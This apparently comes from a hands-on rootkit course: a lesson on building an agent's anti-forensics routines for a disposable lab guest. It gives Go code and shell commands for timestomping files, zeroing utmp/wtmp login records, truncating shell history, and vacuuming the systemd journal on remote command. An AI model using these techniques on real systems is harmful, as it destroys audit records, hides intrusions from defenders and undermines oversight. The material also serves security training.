# L24: Anti-Forensics

## Mission

L23 changes the process name and prevents core dumps, but deployment still
changes timestamps, login records, shell history, and the system journal.
This exercise identifies and modifies those specific local records.

## What you will observe

You will issue one cleanup command, then inspect each affected record directly:

```console
root@victim:~# last | grep student
root@victim:~# test ! -s /home/student/.bash_history && echo empty
empty
root@victim:~# stat -c %Y /tmp/testfile /etc/hostname
1760000000
1760000000
```

An empty login lookup, an empty history file, and equal timestamps demonstrate
three separate changes.
None of them proves that every independent record has disappeared.

## Workspace

```text
exercises/L24-anti-forensics
├── go.mod
└── main.go
```

Complete the cleanup functions and the `CLEANUP` command path in `main.go`.
Perform all tests only in the disposable guest because these operations alter
local audit records.

## Map each record to its cleanup

```text
  Trace                  Tool that finds it    Scrub technique
  -------------------------------------------------------------------
  File mtime/atime       stat, find -newer     os.Chtimes (timestomp)
  Environment vars       /proc/pid/environ     os.Clearenv
  Shell history          history, cat ~/.hist   Truncate history files
  Login records          last, who, w          Rewrite utmp/wtmp binary
  Journal entries        journalctl            Vacuum + rotate journal
```

## Timestomping

`stat` shows three timestamps: atime (last read), mtime (last write), ctime
(last metadata change).
An attacker who drops a file at 3 AM on a server with no nighttime activity
stands out. `os.Chtimes` sets atime and mtime to any value you choose.
The standard technique: copy the timestamp of a nearby legitimate file, so your
file blends into the directory listing sorted by time.

```text
  before:
    -rw-r--r-- 1 root root 0 Oct 17 03:14 agent.bin   <-- stands out
    -rw-r--r-- 1 root root 0 Jan 15 09:22 resolv.conf

  after timestomp (copy resolv.conf's mtime):
    -rw-r--r-- 1 root root 0 Jan 15 09:22 agent.bin   <-- blends in
    -rw-r--r-- 1 root root 0 Jan 15 09:22 resolv.conf
```

Note: ctime cannot be set from userspace.
It updates automatically on any inode change.
Forensic tools that check ctime != mtime can detect timestomping.
This is a known limitation.

## utmp/wtmp scrubbing

`last` and `who` read binary records from `/var/run/utmp` (current logins) and
`/var/log/wtmp` (login history).
Each record is a 384-byte `utmp` struct in the course's amd64 guest.
To scrub: read the file, walk records, zero out entries matching your username
or terminal, write back.

The record layout (from utmpx.h):

```text
  offset  size  field
  0       2     ut_type (7 = USER_PROCESS)
  4       4     ut_pid
  8       32    ut_line ("pts/0")
  40      4     ut_id
  44      256   ut_user ("student")
  300     4     ut_addr_v6[0]
  ...
  384     next record
```

Walk the file in 384-byte chunks.
If ut_user matches your username, zero the entire record.
Write the modified buffer back.

## Journal tampering

systemd-journal records everything: logins, sudo, SSH, service starts.
`journalctl --since "1 hour ago"` shows your activity.
Two approaches:

1. `journalctl --vacuum-time=1s` (requires root, deletes archived journals)
2. Rotate the active journal with
   `systemctl kill --signal=SIGUSR2 systemd-journald`

With the rootkit loaded, escalate first, then vacuum.

## Implement it

Complete `main.go`:

- `timestomp(target, reference string)`: copy mtime from reference to target
- `clearHistory(username)`: truncate root, current-user, and requested-user
  history files
- `scrubUtmp(username string)`: remove login records from utmp and wtmp
- `tamperJournal()`: vacuum and rotate journal
- `cleanup()`: orchestrate all scrubs, clear environment

The agent connects over mTLS, receives a CLEANUP command, and runs all
anti-forensics routines.

### Interfaces used here

```go
// Timestomping
info, _ := os.Stat(referenceFile)
os.Chtimes(targetFile, info.ModTime(), info.ModTime())

// History
os.Truncate(path, 0)

// utmp/wtmp binary record walking
f, _ := os.OpenFile("/var/run/utmp", os.O_RDWR, 0)
buf := make([]byte, 384)
for {
    _, err := io.ReadFull(f, buf)
    user := string(bytes.TrimRight(buf[44:300], "\x00"))
    if user == username {
        clear(buf)
        f.Seek(-384, io.SeekCurrent)
        f.Write(buf)
    }
}

// Journal
exec.Command("journalctl", "--vacuum-time=1s").Run()
exec.Command("systemctl", "kill", "--signal=SIGUSR2", "systemd-journald").Run()

// Environment
os.Clearenv()
```

## Test it

Run the validator against a disposable guest:

```sh
./rklings validate L24
```

It creates the evidence, sends commands over the real mTLS connection, then
inspects the guest state directly:

```text
root@victim:~# stat /tmp/testfile | grep Modify
Modify: 2026-01-15 09:22:00.000000000 +0000

root@victim:~# last | grep student
(no output)

root@victim:~# cat /home/student/.bash_history
(empty)

root@victim:~# journalctl --since "1 hour ago" 2>&1 | head -1
-- No entries --
```

## Validate

```sh
./rklings validate L24
  [+] agent connects over mTLS
  [+] file timestamp matches reference
  [+] no login record for student in utmp
  [+] no login record for student in wtmp
  [+] shell history empty
  [+] environment cleared
  [+] journal vacuumed
  PASS
```

## Next

The cleanup controls work separately.
M03 runs them as one ordered deployment and checks that the agent remains
controllable afterward.
